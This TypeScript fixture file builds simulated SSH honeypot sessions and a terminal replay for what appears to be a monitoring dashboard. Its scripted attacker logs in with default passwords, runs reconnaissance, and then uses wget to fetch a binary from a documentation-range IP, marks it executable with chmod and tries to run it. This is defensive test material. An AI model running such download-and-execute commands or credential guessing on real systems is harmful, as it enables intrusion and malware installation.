/**
 * Hand-written SSH sessions for the terminal replay, in the exact shape the
 * SSH sensor emits (see sensors/ssh/README.md): a `disconnect` event carries
 * `data.replay` as `[delta_seconds, "o" | "i", text]` frames. Documentation
 * addresses only (RFC 5737); the download URL is synthetic.
 */
import type { SensorEvent, Session } from "@/lib/api"
import type { Fixture } from "./fixtures"

export const REPLAY_SESSION_ID = "ReplayDemo01"
export const COMMANDS_ONLY_SESSION_ID = "CmdsOnlyDemo"

type Frame = [number, "o" | "i", string]

const PROMPT = "\x1b[01;32mroot@srv-web01\x1b[00m:\x1b[01;34m~\x1b[00m# "

interface Step {
  /** What the attacker types. */
  input: string
  /** What the shell prints back (LF is converted to CR LF). */
  output: string
  /** Think time before the first key, in seconds. */
  think: number
  prompt?: string
}

const STEPS: Step[] = [
  {
    input: "uname -a",
    output: "Linux srv-web01 6.8.0-45-generic #45-Ubuntu SMP PREEMPT_DYNAMIC x86_64 GNU/Linux\n",
    think: 1.4,
  },
  { input: "cat /proc/cpuinfo | grep name | wc -l", output: "2\n", think: 2.2 },
  { input: "cd /tmp", output: "", think: 1.1, prompt: PROMPT.replace("~", "/tmp") },
  {
    input: "wget http://198.51.100.52/bins/x86_64 -O x",
    output:
      "--2026-10-24 10:12:41--  http://198.51.100.52/bins/x86_64\n" +
      "Connecting to 198.51.100.52:80... connected.\n" +
      "HTTP request sent, awaiting response... 200 OK\n" +
      "Length: 14336 (14K) [application/octet-stream]\n" +
      "Saving to: 'x'\n\n" +
      "x                   100%[===================>]  14.00K  --.-KB/s    in 0s\n\n" +
      "2026-10-24 10:12:42 (118 MB/s) - 'x' saved [14336/14336]\n",
    think: 14.5,
    prompt: PROMPT.replace("~", "/tmp"),
  },
  { input: "chmod +x x", output: "", think: 2.4, prompt: PROMPT.replace("~", "/tmp") },
  {
    input: "./x",
    output: "-bash: ./x: cannot execute binary file: Exec format error\n",
    think: 1.6,
    prompt: PROMPT.replace("~", "/tmp"),
  },
]

const MOTD =
  "Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-45-generic x86_64)\r\n\r\n" +
  " * Documentation:  https://help.ubuntu.com\r\n" +
  " * Management:     https://landscape.canonical.com\r\n\r\n" +
  "Last login: Thu Oct 23 22:41:07 2026 from 192.0.2.10\r\n"

function buildReplay(): Frame[] {
  const frames: Frame[] = [
    [0.4, "o", MOTD],
    [0.05, "o", PROMPT],
  ]
  let prompt = PROMPT
  for (const step of STEPS) {
    let first = true
    for (const ch of step.input) {
      frames.push([first ? step.think : 0.07, "i", ch])
      frames.push([0, "o", ch])
      first = false
    }
    frames.push([0.3, "i", "\r"])
    frames.push([0, "o", "\r\n"])
    if (step.output) frames.push([0.35, "o", step.output.replace(/\n/g, "\r\n")])
    prompt = step.prompt ?? prompt
    frames.push([0.02, "o", prompt])
  }
  frames.push([2.1, "i", "\x04"], [0, "o", "logout\r\n"])
  return frames
}

function iso(ms: number) {
  return new Date(Math.floor(ms / 1000) * 1000).toISOString().replace(".000Z", "Z")
}

function build(id: string, startMs: number, withReplay: boolean, srcIp: string): Fixture {
  const replay = buildReplay()
  const total = replay.reduce((n, f) => n + f[0], 0)
  const base = {
    sensor: "ssh",
    session_id: id,
    src_ip: srcIp,
    src_port: 51744,
    dst_port: 22,
    country: "NL",
    city: "Amsterdam",
    asn: 64496,
    org: "Polder Cloud BV",
    abuse_score: 87,
    known_scanner: false,
    tags: ["crypto-miner", "malware-drop"],
  }
  const events: SensorEvent[] = []
  let eventId = id === REPLAY_SESSION_ID ? 90_000 : 91_000
  const push = (type: string, atS: number, data: Record<string, unknown>) =>
    events.push({ ...base, id: eventId++, ts: iso(startMs + atS * 1000), type, data })

  push("connect", 0, { client_version: "SSH-2.0-libssh_0.9.6" })
  push("login_attempt", 0.9, {
    username: "admin",
    password: "admin",
    success: false,
    method: "password",
  })
  push("login_attempt", 1.7, {
    username: "root",
    password: "123456",
    success: false,
    method: "password",
  })
  push("login_attempt", 2.6, {
    username: "root",
    password: "root",
    success: true,
    method: "password",
  })

  // Command and download events at the time each command was entered.
  let t = 2.6 + 0.4 + 0.05
  for (const step of STEPS) {
    t += step.think + step.input.length * 0.07 + 0.3
    push("command", t, {
      input: step.input,
      output: step.output,
      prompt: step.prompt ?? PROMPT,
      cwd: "/root",
      user: "root",
      status: step.input === "./x" ? 126 : 0,
    })
    if (step.input.startsWith("wget")) {
      push("download_attempt", t + 0.01, {
        url: "http://198.51.100.52/bins/x86_64",
        tool: "wget",
        command: step.input,
        cwd: "/tmp",
        user: "root",
      })
    }
    t += 0.4
  }
  push("disconnect", Math.max(t, 2.6 + total) + 1, {
    duration_s: Math.round(total + 3),
    reason: "eof",
    login_attempts: 3,
    commands: STEPS.length,
    downloads: 1,
    events_suppressed: 0,
    ...(withReplay ? { replay, replay_truncated: false } : {}),
  })

  const last = events.at(-1)
  const session: Session = {
    ...base,
    started_at: iso(startMs),
    ended_at: last?.ts ?? null,
    last_event_at: last?.ts ?? iso(startMs),
    event_count: events.length,
    login_attempts: 3,
    login_success: true,
    commands: STEPS.length,
    downloads: 1,
    http_requests: 0,
  }
  return { session, events }
}

/** Two featured sessions: one with a recorded replay, one with commands only. */
export function buildReplayFixtures(now = Date.now()): Fixture[] {
  return [
    build(REPLAY_SESSION_ID, now - 15 * 60_000, true, "203.0.113.58"),
    build(COMMANDS_ONLY_SESSION_ID, now - 25 * 60_000, false, "198.51.100.77"),
  ]
}
